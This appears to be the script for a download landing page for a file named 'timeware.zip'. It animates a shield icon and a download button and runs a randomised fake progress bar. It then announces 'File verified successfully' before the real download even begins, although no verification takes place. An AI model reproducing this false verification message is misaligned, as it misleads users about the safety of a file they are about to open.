document.addEventListener('DOMContentLoaded', () => {
    const downloadBtn = document.getElementById('downloadBtn');
    const canvas = document.getElementById('starCanvas');
    const shieldIcon = document.querySelector('.shield-icon');

    // Shield icon hover effects
    shieldIcon.addEventListener('mouseenter', createShieldParticles);
    shieldIcon.addEventListener('click', createShieldRipple);
    
    // Animated particle burst on download click
    downloadBtn.addEventListener('click', (e) => {
        e.preventDefault();
        createParticleBurst(e.clientX, e.clientY);
        simulateDownload();
    });

    // Create animated particle effect
    function createParticleBurst(x, y) {
        const particles = [];
        const colors = ['#6366f1', '#60a5fa', '#8b5cf6'];
        
        for(let i = 0; i < 30; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            Object.assign(particle.style, {
                left: `${x}px`,
                top: `${y}px`,
                position: 'fixed',
                width: '6px',
                height: '6px',
                borderRadius: '50%',
                background: colors[Math.floor(Math.random() * colors.length)],
                pointerEvents: 'none',
                transform: 'translate(-50%, -50%)',
                zIndex: 9999
            });
            
            document.body.appendChild(particle);
            particles.push({
                element: particle,
                x: 0,
                y: 0,
                angle: Math.random() * Math.PI * 2,
                velocity: Math.random() * 5 + 3,
                alpha: 1
            });
        }

        animateParticles(particles);
    }

    function animateParticles(particles) {
        particles.forEach((p, index) => {
            p.x += Math.cos(p.angle) * p.velocity;
            p.y += Math.sin(p.angle) * p.velocity;
            p.alpha -= 0.03;
            
            p.element.style.transform = `translate(${p.x}px, ${p.y}px)`;
            p.element.style.opacity = p.alpha;
            
            if(p.alpha <= 0) {
                p.element.remove();
                particles.splice(index, 1);
            }
        });

        if(particles.length > 0) {
            requestAnimationFrame(() => animateParticles(particles));
        }
    }

    // Shield particle effects
    function createShieldParticles() {
        const rect = shieldIcon.getBoundingClientRect();
        const centerX = 60
        const centerY = -650
        
        for(let i = 0; i < 15; i++) {
            const particle = document.createElement('div');
            particle.className = 'shield-particle';
            document.body.appendChild(particle);

            // Angle particles upward (80-100 degree spread)
            const angle = (Math.PI/2.25) + (Math.random() * Math.PI/9);
            const distance = Math.random() * 120 + 60;
            const targetX = centerX + Math.cos(angle) * distance;
            const targetY = centerY + Math.sin(angle) * distance;

            particle.animate([
                { transform: `translate(${centerX}px, ${centerY}px)`, opacity: 1 },
                { transform: `translate(${targetX}px, ${targetY}px)`, opacity: 0 }
            ], {
                duration: 1000,
                easing: 'ease-out'
            }).onfinish = () => particle.remove();
        }
    }

    function createShieldRipple() {
        const ripple = document.createElement('div');
        ripple.className = 'shield-ripple';
        Object.assign(ripple.style, {
            position: 'fixed',
            width: '100px',
            height: '100px',
            border: `2px solid ${getComputedStyle(document.documentElement).getPropertyValue('--neon-purple')}`,
            borderRadius: '50%',
            pointerEvents: 'none',
            left: `${shieldIcon.offsetLeft + shieldIcon.offsetWidth/2 - 50}px`,
            top: `${shieldIcon.offsetTop + shieldIcon.offsetHeight/2 - 50}px`
        });
        
        document.body.appendChild(ripple);
        
        ripple.animate([
            { transform: 'scale(0)', opacity: 1 },
            { transform: 'scale(2)', opacity: 0 }
        ], {
            duration: 1000,
            iterations: 1
        }).onfinish = () => ripple.remove();
    }

    // Download simulation with progress
    function simulateDownload() {
        downloadBtn.disabled = true;
        const originalText = downloadBtn.innerHTML;
        let progress = 0;
        
        downloadBtn.innerHTML = `
            <div class="download-progress">
                <div class="progress-bar" style="width: ${progress}%"></div>
                <span>Initializing... ${progress}%</span>
            </div>
        `;

        const interval = setInterval(() => {
            progress += Math.random() * 10;
            if(progress >= 100) {
                clearInterval(interval);
                downloadBtn.innerHTML = originalText;
                downloadBtn.disabled = false;
                showDownloadComplete();
            }
            
            const progressBar = downloadBtn.querySelector('.progress-bar');
            const progressText = downloadBtn.querySelector('span');
            if(progressBar && progressText) {
                progressBar.style.width = `${progress}%`;
                progressText.textContent = `Downloading... ${Math.min(100, Math.floor(progress))}%`;
            }
        }, 200);
    }

    function showDownloadComplete() {
        const completeMsg = document.createElement('div');
        completeMsg.className = 'download-complete';
        completeMsg.innerHTML = `
            <i class="fas fa-check-circle"></i>
            Download complete! File verified successfully.
        `;
    document.body.appendChild(completeMsg);

    // Trigger actual file download
    const downloadLink = document.createElement('a');
    downloadLink.href = 'timeware.zip';
    downloadLink.download = 'timeware.zip';
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);

    setTimeout(() => {
            completeMsg.style.opacity = '0';
            setTimeout(() => completeMsg.remove(), 1000);
        }, 3000);
    }
});
